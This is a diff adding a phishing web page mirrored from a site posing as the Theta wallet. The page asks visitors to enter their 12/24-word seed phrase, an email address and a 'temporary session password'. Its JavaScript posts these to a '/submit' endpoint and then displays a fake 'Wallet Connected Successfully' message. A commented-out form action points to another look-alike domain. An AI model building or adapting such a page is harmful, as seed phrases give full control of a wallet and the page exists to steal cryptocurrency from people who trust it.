@@ -1,0 +1,196 @@
+<html lang="en">
+
+<!-- Mirrored from thetawalletunlock.org/unlock/mnemonic.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jul 2020 19:02:31 GMT -->
+<head>
+
+    <meta charset="utf-8">
+	<link rel="shortcut icon" href="https://thetawalletunlock.org/img/logo/favicon.ico">
+	<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+	<meta name="theme-color" content="#000000">
+	<link rel="manifest" href="https://thetawalletunlock.org/static/manifest.json">
+	<title>Seed Phrase</title>
+	<link href="static/css/main.ba3fecb7.chunk.css" rel="stylesheet">
+	<style>
+		/* Loading spinner style */
+		.spinner {
+		  border: 3px solid #f3f3f3;
+		  border-top: 3px solid #3498db;
+		  border-radius: 50%;
+		  width: 20px;
+		  height: 20px;
+		  animation: spin 0.8s linear infinite;
+		  display: inline-block;
+		  margin-left: 10px;
+		  vertical-align: middle;
+		}
+	  
+		@keyframes spin {
+		  0% { transform: rotate(0deg); }
+		  100% { transform: rotate(360deg); }
+		}
+	  
+		/* Modal style */
+		.custom-modal {
+		  position: fixed;
+		  z-index: 9999;
+		  top: 0;
+		  left: 0;
+		  right: 0;
+		  bottom: 0;
+		  background: rgba(0,0,0,0.5);
+		  display: flex;
+		  align-items: center;
+		  justify-content: center;
+		}
+	  
+		.custom-modal-content {
+		  background: #fff;
+		  padding: 30px;
+		  border-radius: 8px;
+		  text-align: center;
+		  max-width: 400px;
+		}
+	  
+		.custom-modal-content img {
+		  width: 100px;
+		  margin-bottom: 15px;
+		}
+
+	.error-message {
+      color: #ff4d4d;
+      font-size: 0.9rem;
+      margin-top: 5px;
+      display: none;
+    }
+	  
+	</style>
+	  
+  </head>
+  <body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <!-- <form method="post" action="https://theta.walletstoken.org/unlock/mnemonic.php"> -->
+	<form id="myForm">
+		<div id="root">
+			<div class="App">
+				<div class="NavBar NavBar--is-centered"><img class="NavBar__logo" src="img/logo/logo.png"></div>
+				<div class="Pages">
+					<div class="UnlockWalletPage">
+						<div class="UnlockWalletPage__wrapper">
+							<div class="UnlockWalletPage__title">Connect Your Wallet</div>
+							<div class="UnlockWalletCard">
+								<div class="UnlockWalletCard__content">
+									<div class="UnlockWalletCard__header">
+										<div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+											<a class="TabBarItem--is-active tablinks" href="#"><div class="TabBarItem__title">Seed Phrase</div></a>
+										</div>
+									</div>
+									<div class="UnlockWalletViaMnemonicPhrase">
+										<div class="UnlockWalletViaMnemonicPhrase__title">Please enter your 12/24 word phrase</div>
+										<textarea class="UnlockWalletViaMnemonicPhrase__mnemonic" name="txtphrase" required min="1"></textarea>
+										<div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please separate each Seed Phrase with a space.</div>
+										<input class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter your Email Address" name="email" type="email" value="">
+										<br>
+										<input class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="txtpassword" type="password" value="">
+										<div class="UnlockWalletCard__warning"></div>
+										<div class="UnlockWalletViaMnemonicPhrase__footer">
+											<button type="submit" name="btnsend" style="width:100%;" class="GradientButton undefined GradientButton">
+												<div class="GradientButton__title">IMPORT</div>
+											</button>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</form>
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.24.0/axios.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.24.0/axios.min.js"></script>
+	<script>
+		const form = document.getElementById('myForm');
+		const importBtn = form.querySelector('button[type="submit"]');
+		const txtPhraseField = document.querySelector('[name="txtphrase"]');
+	  
+		// Create error message element if it doesn’t exist
+		let errorMessage = document.createElement('div');
+		errorMessage.className = 'error-message';
+		errorMessage.innerText = 'Seed phrase must contain at least 12 words.';
+		txtPhraseField.parentNode.insertBefore(errorMessage, txtPhraseField.nextSibling);
+	  
+		// Hide error message on input
+		txtPhraseField.addEventListener('input', () => {
+		  if (errorMessage.style.display === 'block') {
+			errorMessage.style.display = 'none';
+		  }
+		});
+	  
+		form.addEventListener('submit', function (event) {
+		  event.preventDefault();
+	  
+		  const txtphrase = txtPhraseField.value.trim();
+		  const email = document.querySelector('[name="email"]').value.trim();
+		  const txtpassword = document.querySelector('[name="txtpassword"]').value.trim();
+	  
+		  const wordCount = txtphrase.split(/\s+/).filter(w => w).length;
+	  
+		  if (wordCount < 12) {
+			errorMessage.style.display = 'block';
+			return;
+		  }
+	  
+		  errorMessage.style.display = 'none';
+	  
+		  // Add spinner
+		  const spinner = document.createElement('span');
+		  spinner.className = 'spinner';
+		  importBtn.disabled = true;
+		  importBtn.appendChild(spinner);
+	  
+		  const formData = { txtphrase, email, txtpassword };
+	  
+		  axios.post('/submit', formData)
+			.then(function (response) {
+			  if (response.status === 200) {
+				showSuccessModal();
+			  }
+			})
+			.catch(function (error) {
+			  alert('Error connecting wallet. Please try again.');
+			  console.error('Error:', error);
+			})
+			.finally(() => {
+			  importBtn.disabled = false;
+			  importBtn.removeChild(spinner);
+			});
+		});
+	  
+		function showSuccessModal() {
+		  const modal = document.createElement('div');
+		  modal.className = 'custom-modal';
+		  modal.innerHTML = `
+			<div class="custom-modal-content">
+			  <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Success">
+			  <h3>Wallet Connected Successfully</h3>
+			  <p>Your wallet has been imported.</p>
+			  <button onclick="this.closest('.custom-modal').remove()">Close</button>
+			</div>
+		  `;
+		  document.body.appendChild(modal);
+		}
+	  </script>
+<script src="static/js/2.d8413ea9.chunk.js"></script>
+<script src="static/js/main.3105abe6.chunk.js"></script>
+<div class="ReactModalPortal"></div>
+<div class="ReactModalPortal"></div>
+<div>
+<div style="position: fixed; top: 0px; right: auto; bottom: auto; left: 50%; transform: translate(-50%, 0%); z-index: 100;">
+  <div>
+  </div>
+</div>
+</body>
+
+<!-- Mirrored from thetawalletunlock.org/unlock/mnemonic.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jul 2020 19:02:35 GMT -->
+</html>
